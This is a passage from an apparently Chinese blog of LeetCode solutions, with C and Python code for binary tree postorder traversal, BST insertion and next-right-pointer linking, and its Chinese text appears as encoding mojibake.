class="built_in">next</span> = start.right</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">                        self.next_start = start.right</span><br><span class="line"></span><br><span class="line">                    self.last_node = start.right</span><br><span class="line"></span><br><span class="line">                start = start.<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line">            start = self.next_start</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connectList</span>(<span class="params">self, node: <span class="string">&#x27;Node&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.last_node != <span class="literal">None</span>:</span><br><span class="line">            self.last_node.<span class="built_in">next</span> = node</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.next_start == <span class="literal">None</span>:</span><br><span class="line">            self.next_start = node</span><br><span class="line"></span><br><span class="line">        self.last_node = node</span><br></pre></td></tr></table></figure><p>![XTJUK27UN3_66_OSL5&#96;_BZB.png](<a href="https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png">https://i.loli.net/2020/09/28/ywXFL85CP4Zm2B6.png</a>)</p><h2 id="0x05-äºŒå‰æ ‘çš„ååºéå†"><a href="#0x05-äºŒå‰æ ‘çš„ååºéå†" class="headerlink" title="0x05.äºŒå‰æ ‘çš„ååºéå†"></a>0x05.<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">äºŒå‰æ ‘çš„ååºéå†</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œè¿”å›å®ƒçš„ ååº éå†ã€‚</p><p>ç¤ºä¾‹:</p><p>è¾“å…¥: [1,null,2,3]<br>1<br> <br>  2<br> &#x2F;<br>3 </p><p>è¾“å‡º: [3,2,1]<br>è¿›é˜¶: é€’å½’ç®—æ³•å¾ˆç®€å•ï¼Œä½ å¯ä»¥é€šè¿‡è¿­ä»£ç®—æ³•å®Œæˆå—ï¼Ÿ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal">https://leetcode-cn.com/problems/binary-tree-postorder-traversal</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜ä¸º2020.9.29çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h3 id="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’åç»­éå†"><a href="#è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’åç»­éå†" class="headerlink" title="è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + é€’å½’åç»­éå†"></a>è§£æ³•ä¸€ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + é€’å½’åç»­éå†</h3><p>ååºéå†çš„é¡ºåºæ˜¯<strong>å·¦â†’å³â†’æ ¹</strong>ï¼Œä½¿ç”¨é€’å½’å¯ä»¥ä¸‰åˆ†é’Ÿå†…è§£å†³</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-2"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-2" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¿‡ä¸€éï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-2"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-2" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¦å¼€è¾Ÿä¸€ä¸ªå•ç‹¬çš„æ ˆå¸§ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> * retn;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        dfs(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        dfs(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    retn[size++] = root-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">postorderTraversal</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retn = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/29/Smo2vrKwWfjH1Ta.png" alt="_B35__WY2L_Z`E_`27DA_FM.png"></p><h2 id="0x06-äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œ"><a href="#0x06-äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œ" class="headerlink" title="0x06. äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œ"></a>0x06.<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/"> äºŒå‰æœç´¢æ ‘ä¸­çš„æ’å…¥æ“ä½œ</a></h2><blockquote><p>ç»™å®šäºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰çš„æ ¹èŠ‚ç‚¹å’Œè¦æ’å…¥æ ‘ä¸­çš„å€¼ï¼Œå°†å€¼æ’å…¥äºŒå‰æœç´¢æ ‘ã€‚ è¿”å›æ’å…¥åäºŒå‰æœç´¢æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ è¾“å…¥æ•°æ®ä¿è¯ï¼Œæ–°å€¼å’ŒåŸå§‹äºŒå‰æœç´¢æ ‘ä¸­çš„ä»»æ„èŠ‚ç‚¹å€¼éƒ½ä¸åŒã€‚</p><p>æ³¨æ„ï¼Œå¯èƒ½å­˜åœ¨å¤šç§æœ‰æ•ˆçš„æ’å…¥æ–¹å¼ï¼Œåªè¦æ ‘åœ¨æ’å…¥åä»ä¿æŒä¸ºäºŒå‰æœç´¢æ ‘å³å¯ã€‚ ä½ å¯ä»¥è¿”å›ä»»æ„æœ‰æ•ˆçš„ç»“æœã€‚</p><p>ä¾‹å¦‚, </p><p>ç»™å®šäºŒå‰æœç´¢æ ‘:</p><pre><code>    4   / \  2   7 / \1   3</code></pre><p>å’Œ æ’å…¥çš„å€¼: 5<br>ä½ å¯ä»¥è¿”å›è¿™ä¸ªäºŒå‰æœç´¢æ ‘:</p><pre><code>     4   /   \  2     7 / \   /1   3 5</code></pre><p>æˆ–è€…è¿™ä¸ªæ ‘ä¹Ÿæ˜¯æœ‰æ•ˆçš„:</p><pre><code>     5   /   \  2     7 / \   1   3     \      4</code></pre><p>æç¤ºï¼š</p><p>ç»™å®šçš„æ ‘ä¸Šçš„èŠ‚ç‚¹æ•°ä»‹äº 0 å’Œ 10^4 ä¹‹é—´<br>æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ•´æ•°å€¼ï¼Œå–å€¼èŒƒå›´ä» 0 åˆ° 10^8<br>-10^8 &lt;&#x3D; val &lt;&#x3D; 10^8<br>æ–°å€¼å’ŒåŸå§‹äºŒå‰æœç´¢æ ‘ä¸­çš„ä»»æ„èŠ‚ç‚¹å€¼éƒ½ä¸åŒ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree">https://leetcode-cn.com/problems/insert-into-a-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜ä¸º2020.9.30çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h3 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-1" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h3><p>æ·±åº¦ä¼˜å…ˆæœç´¢éå†è¿™æ£µæ ‘ï¼Œ <strong>æ’å…¥å€¼å¤§äºç»“ç‚¹å€¼åˆ™å¾€å³å­æ ‘æ’ï¼Œå¦åˆ™å¾€å·¦å­æ ‘æ’</strong></p><p><strong>é€’å½’</strong>å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-3"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-3" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½æœ‰å¯èƒ½è¿‡ä¸€éï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-3"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-3" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>æ¯ä¸ªç»“ç‚¹éƒ½è¦å¼€è¾Ÿä¸€ä¸ªå•ç‹¬çš„æ ˆå¸§ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(val &gt; root-&gt;val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;right = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">            root-&gt;right-&gt;val = val;</span><br><span class="line">            root-&gt;right-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;right-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!root-&gt;left)</span><br><span class="line">        &#123;</span><br><span class="line">            root-&gt;left = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">            root-&gt;left-&gt;val = val;</span><br><span class="line">            root-&gt;left-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">            root-&gt;left-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            dfs(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">insertIntoBST</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        root = (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">        root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        root-&gt;val = val;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root, val);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![Z08G_KN_4GTD1&#96;J_3NC0__F.png](<a href="https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png">https://i.loli.net/2020/09/30/EUIqglNFiRvJCoz.png</a>)</p><h2 id="0x07-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ"><a href="#0x07-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ" class="headerlink" title="0x07. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ"></a>0x07.<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node/"> å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªå®Œç¾äºŒå‰æ ‘ï¼Œå…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚äºŒå‰æ ‘å®šä¹‰å¦‚ä¸‹ï¼š</p><p>struct Node {<br>int val;<br>Node *left;<br>Node *right;<br>Node *next;<br>}<br>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/15/116_sample.png" alt="image.png"></p><p>è¾“å…¥ï¼š{â€œ$idâ€:â€1â€,â€leftâ€:{â€œ$idâ€:â€2â€,â€leftâ€:{â€œ$idâ€:â€3â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:4},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€4â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:5},â€valâ€:2},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€5â€,â€leftâ€:{â€œ$idâ€:â€6â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:6},â€nextâ€:null,â€rightâ€:{â€œ$idâ€:â€7â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:7},â€valâ€:3},â€valâ€:1}</p><p>è¾“å‡ºï¼š{â€œ$idâ€:â€1â€,â€leftâ€:{â€œ$idâ€:â€2â€,â€leftâ€:{â€œ$idâ€:â€3â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€4â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€5â€,â€leftâ€:null,â€nextâ€:{â€œ$idâ€:â€6â€,â€leftâ€:null,â€nextâ€:null,â€rightâ€:null,â€valâ€:7},â€rightâ€:null,â€valâ€:6},â€rightâ€:null,â€valâ€:5},â€rightâ€:null,â€valâ€:4},â€nextâ€:{â€œ$idâ€:â€7â€,â€leftâ€:{â€œ$refâ€:â€5â€},â€nextâ€:null,â€rightâ€:{â€œ$refâ€:â€6â€},â€valâ€:3},â€rightâ€:{â€œ$refâ€:â€4â€},â€valâ€:2},â€nextâ€:null,â€rightâ€:{â€œ$refâ€:â€7â€},â€valâ€:1}</p><p>è§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚</p><p>æç¤ºï¼š</p><p>ä½ åªèƒ½ä½¿ç”¨å¸¸é‡çº§é¢å¤–ç©ºé—´ã€‚<br>ä½¿ç”¨é€’å½’è§£é¢˜ä¹Ÿç¬¦åˆè¦æ±‚ï¼Œæœ¬é¢˜ä¸­é€’å½’ç¨‹åºå ç”¨çš„æ ˆç©ºé—´ä¸ç®—åšé¢å¤–çš„ç©ºé—´å¤æ‚åº¦ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node">https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šæœ¬é¢˜å’Œ2020.9.28çš„æ¯æ—¥ä¸€é¢˜å‡ ä¹å®Œå…¨ä¸€æ ·</p></blockquote><h3 id="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†-1"><a href="#è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†-1" class="headerlink" title="è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†"></a>è§£æ³•ä¸€ï¼šå±‚æ¬¡éå†</h3><p>æˆ‘ä»¬è€ƒè™‘åˆ°å½“æˆ‘ä»¬å¡«å……nextæŒ‡é’ˆå°†æ¯ä¸€å±‚çš„ç»“ç‚¹éƒ½è¿æ¥èµ·æ¥åï¼Œ<strong>è¯¥å±‚æ‰€æœ‰ç»“ç‚¹ä¾¿æ„æˆäº†ä¸€ä¸ªå•å‘é“¾è¡¨</strong>ï¼Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡éå†æ¯ä¸€å±‚çš„é“¾è¡¨æ¥æ„é€ ä¸‹ä¸€å±‚çš„é“¾è¡¨</strong></p><p>å¤§è‡´è¿‡ç¨‹å¦‚ä¸‹å›¾</p><p><img src="https://i.loli.net/2020/09/28/485DnfumcRterSM.png" alt="BD12E33FCF6E3B97FC6DB3AF5B645CF2.png"></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-4"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-4" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ¯ä¸ªç»“ç‚¹éƒ½è¦éå†ä¸€æ¬¡ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-4"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-4" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>ç”±äºæ²¡æœ‰ä½¿ç”¨åˆ°é¢å¤–çš„ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * struct Node &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct Node *left;</span></span><br><span class="line"><span class="comment"> *     struct Node *right;</span></span><br><span class="line"><span class="comment"> *     struct Node *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">last_node</span>, *<span class="title">next_start</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">connectList</span><span class="params">(<span class="keyword">struct</span> Node * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(last_node)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Node* <span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node* root)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">start</span> =</span> root;</span><br><span class="line">    <span class="keyword">while</span>(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = <span class="literal">NULL</span>, next_start = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(start)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/15/p3if4WBZnAScgLI.png" alt="image.png"></p><h1 id="0x03-éš¾åº¦ï¼šå›°éš¾"><a href="#0x03-éš¾åº¦ï¼šå›°éš¾" class="headerlink" title="0x03.éš¾åº¦ï¼šå›°éš¾"></a>0x03.éš¾åº¦ï¼šå›°éš¾</h1><h2 id="0x00-å†—ä½™è¿æ¥-II"><a href="#0x00-å†—ä½™è¿æ¥-II" class="headerlink" title="0x00. å†—ä½™è¿æ¥ II"></a>0x00.<a href="https://leetcode-cn.com/problems/redundant-connection-ii/"> å†—ä½™è¿æ¥ II</a></h2><blockquote><p>åœ¨æœ¬é—®é¢˜ä¸­ï¼Œæœ‰æ ¹æ ‘æŒ‡æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æœ‰å‘å›¾ã€‚è¯¥æ 